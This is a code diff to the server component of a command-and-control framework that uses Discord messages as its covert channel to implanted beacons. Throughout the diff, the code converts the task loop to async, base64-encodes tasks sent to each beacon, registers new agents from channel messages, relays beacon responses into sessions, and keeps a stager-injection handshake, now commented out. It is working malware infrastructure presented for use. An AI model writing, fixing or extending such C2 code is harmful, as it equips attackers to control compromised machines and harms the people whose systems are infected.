@@ -35,7 +35,7 @@ def importModule(modName, modType):
     exec(importName, globals())
 
 
-def createConnection(beaconId):
+async def createConnection(beaconId):
     """
     Function responsible for configuring the initial stager
     for an incoming connection. Will return the socket connection
@@ -47,14 +47,14 @@ def createConnection(beaconId):
     # Start with logic to setup the connection to the external_c2 server
     sock = commonUtils.createSocket()
 
-    while True:
-        # Replace this with the actual implementation to check for messages from the client
-        message = commonUtils.recvFrameFromC2(sock)  # Example method to receive messages
-        if message == "READY2INJECT":
-            if config.verbose:
-                print(commonUtils.color("Client ready to receive stager"))
-            break  # Exit the loop once the client confirms readiness
-        sleep(5)  # Poll every second, adjust as necessary
+    # while True:
+    #     # Replace this with the actual implementation to check for messages from the client
+    #     message = commonUtils.recvFrameFromC2(sock)  # Example method to receive messages
+    #     if message == "READY2INJECT":
+    #         if config.verbose:
+    #             print(commonUtils.color("Client ready to receive stager"))
+    #         break  # Exit the loop once the client confirms readiness
+    #     sleep(5)  # Poll every second, adjust as necessary
 
     # Prep the transport module
     prep_trans = transport_discord.prepTransport()
@@ -74,8 +74,22 @@ async def sendTask(channel, task, beaconId):
     """
     Sends a task to the beacon via a Discord message.
     """
-    encoded_task = encoder_base64.encode(task)
-    await channel.send(f"Task for {beaconId}: {encoded_task}")
+    # Check if the task is None or an empty string
+    if task is None or task == "":
+        print(f"Warning: No task available to send for beaconId {beaconId}.")
+        return  # Early return if there's no task
+
+    try:
+        # Encode the task; ensure it’s a string or bytes before encoding
+        if isinstance(task, str):
+            task = task.encode()  # Convert string to bytes for encoding
+
+        encoded_task = encoder_base64.encode(task)  # This should now work without errors
+
+        # Send the encoded task in a Discord message
+        await channel.send(f"Task for {beaconId}: {encoded_task.decode()}")  # Decode back to string for sending
+    except Exception as e:
+        print(f"Error sending task: {e}")
 
 
 async def fetchResponse(channel, beaconId):
@@ -88,7 +102,7 @@ async def fetchResponse(channel, beaconId):
             return encoder_base64.decode(encoded_response)
     return None
 
-def taskLoop(beaconId, channel):
+async def taskLoop(beaconId, channel):
     while True:
         if config.verbose:
             print(commonUtils.color(f"Checking for tasks for {beaconId}..."))
@@ -99,20 +113,21 @@ def taskLoop(beaconId, channel):
         # Relay the task to the client
         if config.debug:
             print(commonUtils.color(f"Relaying task to {beaconId}"))
-        
-        # Sending task via Discord
-        asyncio.run(sendTask(channel, newTask, beaconId))
+
+        # Send task via Discord, awaiting the coroutine properly
+        await sendTask(channel, newTask, beaconId)  # Just await the function
 
         if config.verbose:
             print(commonUtils.color(f"Checking for response from {beaconId}..."))
 
-        # Fetch and process responses
-        response = asyncio.run(fetchResponse(channel, beaconId))
+        # Fetch and process responses, awaiting the coroutine
+        response = await fetchResponse(channel, beaconId)
         if response:
             establishedSession.relayResponse(beaconId, response)
 
         # Sleep to avoid constant polling
-        sleep(config.C2_BLOCK_TIME / 100)
+        await asyncio.sleep(config.C2_BLOCK_TIME / 100)  # Use asyncio.sleep instead of time.sleep
+
 
 
 @client.event
@@ -126,18 +141,20 @@ async def on_message(message):
     This function checks for new agents (beacons) registering and processes tasks/responses.
     """
     if message.channel.id == CHANNEL_ID:
-        if message.content.startswith("AGENT:"):
-            beaconId = message.content.split("AGENT:")[1]
+        if message.content.startswith("[+] Registering new agent AGENT:"):
+            beaconId = message.content.split("[+] Registering new agent AGENT:")[1].strip()
             print(f"New agent registered: {beaconId}")
 
-                # Start a new task loop for this agent
+            # Start a new task loop for this agent
             if beaconId not in beacons:
                 print(f"[+] Established new session {beaconId}. Starting task loop.")
                 channel = message.channel
                 sock = createConnection(beaconId)
-                t = Thread(target=taskLoop, args=(beaconId, channel))
-                t.daemon = True
-                t.start()
+
+                # Create a new asyncio task for the taskLoop
+                asyncio.create_task(taskLoop(beaconId, channel))
+
+                # Store the socket in the beacons dictionary
                 beacons[beaconId] = sock
 
 def main():
